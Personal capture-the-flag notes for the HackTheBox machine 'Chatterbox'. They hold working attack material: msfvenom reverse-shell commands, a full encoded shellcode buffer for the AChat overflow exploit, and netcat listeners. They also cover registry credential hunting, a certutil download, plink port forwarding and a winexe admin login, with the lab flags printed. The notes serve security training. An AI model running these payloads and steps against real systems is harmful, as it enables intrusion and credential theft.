# scanning

Only 2 ports open

```
PORT     STATE SERVICE REASON          VERSION
9255/tcp open  http    syn-ack ttl 127 AChat chat system httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat   syn-ack ttl 127 AChat chat system
```

According to feroxbuster output we may be able to RFI on this box.

```
200        1l        2w     1078c http://10.10.10.74:9255/favicon.ico
204        0l        0w        0c http://10.10.10.74:9255/render/https://www.google.com
204        0l        0w        0c http://10.10.10.74:9255/render/https://www.google.com.txt
204        0l        0w        0c http://10.10.10.74:9255/render/https://www.google.com.html
204        0l        0w        0c http://10.10.10.74:9255/render/https://www.google.com.php
204        0l        0w        0c http://10.10.10.74:9255/render/https://www.google.com.asp
204        0l        0w        0c http://10.10.10.74:9255/render/https://www.google.com.aspx
204        0l        0w        0c http://10.10.10.74:9255/render/https://www.google.com.jsp
```

Trying with aspx first.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=8081 -f aspx > s16-4-8081.aspx
```

Then host with python

```
$ python3 -m http.server 80
```

Listener:

```
$ nc -nvlp 8081
```

Trigger rev, shell by going to
10.10.10.74:9255/render/http://10.10.16.4:80/s16-4-8081.aspx

No dice with aspx. Trying php instead
![[5c558e1181ea450da9c5d270710432de.png]]

# You fool, it was the achat exploit

I saw this on searchsploit but it wasn't working. The payload needed to be modified.
![[65c89b6a9f554899bebeace2841aa040.png]]

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4567 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Then paste the results into the exploit in place of the existing results.

```
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x39\x6c\x6a\x48\x62\x62"
buf += b"\x6d\x30\x6d\x30\x59\x70\x53\x30\x72\x69\x4b\x35\x6d"
buf += b"\x61\x77\x50\x61\x54\x72\x6b\x62\x30\x6e\x50\x32\x6b"
buf += b"\x6f\x62\x5a\x6c\x34\x4b\x6f\x62\x7a\x74\x52\x6b\x72"
buf += b"\x52\x4b\x78\x4a\x6f\x56\x57\x6d\x7a\x4b\x76\x6c\x71"
buf += b"\x69\x6f\x44\x6c\x6f\x4c\x53\x31\x43\x4c\x4d\x32\x6c"
buf += b"\x6c\x6d\x50\x75\x71\x78\x4f\x7a\x6d\x49\x71\x37\x57"
buf += b"\x5a\x42\x48\x72\x50\x52\x6e\x77\x32\x6b\x71\x42\x4a"
buf += b"\x70\x54\x4b\x4e\x6a\x4d\x6c\x64\x4b\x4e\x6c\x7a\x71"
buf += b"\x33\x48\x6a\x43\x61\x38\x6b\x51\x5a\x31\x50\x51\x34"
buf += b"\x4b\x51\x49\x6d\x50\x39\x71\x38\x53\x72\x6b\x6d\x79"
buf += b"\x5a\x78\x6a\x43\x6f\x4a\x71\x39\x52\x6b\x4e\x54\x44"
buf += b"\x4b\x49\x71\x66\x76\x4c\x71\x59\x6f\x46\x4c\x35\x71"
buf += b"\x38\x4f\x6c\x4d\x6a\x61\x75\x77\x70\x38\x6b\x30\x61"
buf += b"\x65\x4c\x36\x6c\x43\x51\x6d\x69\x68\x6f\x4b\x71\x6d"
buf += b"\x4d\x54\x53\x45\x47\x74\x6e\x78\x72\x6b\x30\x58\x4c"
buf += b"\x64\x39\x71\x47\x63\x4f\x76\x74\x4b\x4a\x6c\x50\x4b"
buf += b"\x64\x4b\x31\x48\x6d\x4c\x6a\x61\x59\x43\x64\x4b\x6c"
buf += b"\x44\x44\x4b\x69\x71\x5a\x30\x54\x49\x30\x44\x4b\x74"
buf += b"\x4b\x74\x71\x4b\x6f\x6b\x50\x61\x4f\x69\x4e\x7a\x70"
buf += b"\x51\x39\x6f\x67\x70\x6f\x6f\x31\x4f\x51\x4a\x62\x6b"
buf += b"\x4a\x72\x4a\x4b\x74\x4d\x71\x4d\x31\x58\x4f\x43\x6f"
buf += b"\x42\x69\x70\x69\x70\x4f\x78\x71\x67\x71\x63\x6e\x52"
buf += b"\x4f\x6f\x6e\x74\x31\x58\x50\x4c\x30\x77\x4d\x56\x79"
buf += b"\x77\x69\x6f\x36\x75\x37\x48\x76\x30\x49\x71\x6b\x50"
buf += b"\x4b\x50\x6b\x79\x77\x54\x6f\x64\x50\x50\x32\x48\x4b"
buf += b"\x79\x65\x30\x32\x4b\x49\x70\x39\x6f\x37\x65\x62\x30"
buf += b"\x42\x30\x70\x50\x62\x30\x6d\x70\x72\x30\x6d\x70\x70"
buf += b"\x50\x61\x58\x7a\x4a\x7a\x6f\x37\x6f\x6b\x30\x59\x6f"
buf += b"\x46\x75\x66\x37\x51\x5a\x59\x75\x42\x48\x6a\x6a\x59"
buf += b"\x7a\x6a\x70\x69\x74\x72\x48\x79\x72\x6d\x30\x6b\x61"
buf += b"\x49\x47\x61\x79\x4b\x36\x50\x6a\x4a\x70\x4e\x76\x70"
buf += b"\x57\x63\x38\x73\x69\x44\x65\x34\x34\x73\x31\x6b\x4f"
buf += b"\x7a\x35\x31\x75\x67\x50\x44\x34\x4c\x4c\x79\x6f\x70"
buf += b"\x4e\x6a\x68\x62\x55\x48\x6c\x72\x48\x4a\x50\x57\x45"
buf += b"\x47\x32\x61\x46\x59\x6f\x59\x45\x33\x38\x4f\x73\x50"
buf += b"\x6d\x6f\x74\x69\x70\x61\x79\x37\x73\x70\x57\x42\x37"
buf += b"\x70\x57\x6e\x51\x6b\x46\x71\x5a\x4b\x62\x4f\x69\x4f"
buf += b"\x66\x39\x52\x4b\x4d\x33\x36\x55\x77\x51\x34\x4c\x64"
buf += b"\x4d\x6c\x4d\x31\x4a\x61\x42\x6d\x6e\x64\x6f\x34\x5a"
buf += b"\x70\x69\x36\x39\x70\x4f\x54\x70\x54\x42\x30\x72\x36"
buf += b"\x6e\x76\x6e\x76\x70\x46\x4f\x66\x6e\x6e\x51\x46\x6f"
buf += b"\x66\x52\x33\x31\x46\x52\x48\x51\x69\x48\x4c\x4f\x4f"
buf += b"\x43\x56\x49\x6f\x48\x55\x65\x39\x69\x50\x4e\x6e\x51"
buf += b"\x46\x71\x36\x79\x6f\x6c\x70\x31\x58\x39\x78\x53\x57"
buf += b"\x4b\x6d\x63\x30\x69\x6f\x69\x45\x37\x4b\x48\x70\x64"
buf += b"\x75\x73\x72\x42\x36\x52\x48\x63\x76\x44\x55\x67\x4d"
buf += b"\x75\x4d\x4b\x4f\x49\x45\x6d\x6c\x6a\x66\x31\x6c\x4a"
buf += b"\x6a\x33\x50\x4b\x4b\x49\x50\x53\x45\x79\x75\x75\x6b"
buf += b"\x51\x37\x4d\x43\x70\x72\x62\x4f\x61\x5a\x69\x70\x32"
buf += b"\x33\x6b\x4f\x69\x45\x41\x41"
```

fire up a listener

```
$ nc -nvlp 4567
```

Run the exploit

```
$ ./36025.py 
---->{P00F}!
                
```

## We got a shell

```
$ nc -nvlp 4567
listening on [any] 4567 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.74] 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred

```

The user is `alfred`

got the user flag.
![[0b57f721b52d4ef78508b2a2c85ea811.png]]

`b763f61d78cdc20897cde550a26fca32`

## Will need privesc to get root flag

![[6191ade6421047bc8fb451505f398788.png]]

# Enum

found a password in registry `Welcome1!`
![[78860ba6dca54a31a86914e851a213a3.png]]

### Keep searching the registry for passwords

`C:\>reg query HKLM /f password /t REG_SZ /s`
Which returned a bunch of results

```
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7be73787-ce71-4b33-b4c8-00d32b54bea8}
    (Default)    REG_SZ    HomeGroup Password

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest
    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK
    Text    REG_SZ    Prompt for user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT
    Text    REG_SZ    Automatic logon with current user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{63d2bb1d-e39a-41b8-9a3d-52dd06677588}\ChannelReferences\5
    (Default)    REG_SZ    Microsoft-Windows-Shell-AuthUI-PasswordProvider/Diagnostic

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password - PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 49 match(es) found.

```

### There are more sockets available from the localhost than when a scan was performed from remote host.
![[fc32e7e040fc46589df7cd81c5b1b3f8.png]]

### Upload plink.exe for port forwarding.
1. Host plink.exe (x86) with python http.server
2. download plink.exe to target with `certutil -urlcache -f http://<pythonServer>/plink.exe plink.exe`
3. Set up Remote port forwarding `plink.exe -l <attackerSSHUser> -pw <attackerSSHPass> -R 445:127.0.0.1:445 -P 2223 <attackerIP>`
	1. In this case I had to add -P 2223 and host my ssh server on 2223 as it wasn't working on 22.
4. Use winexe to start a cmd.exe session as Administrator `winexe -U Administrator%Welsome1! //127.0.0.1 "cmd.exe"`
### We now have an admin shell
![[5aa72bd5f2684f85b8dd4d96788fec40.png]]

**root**: `9243728e195ae3288bec1444287a40d7`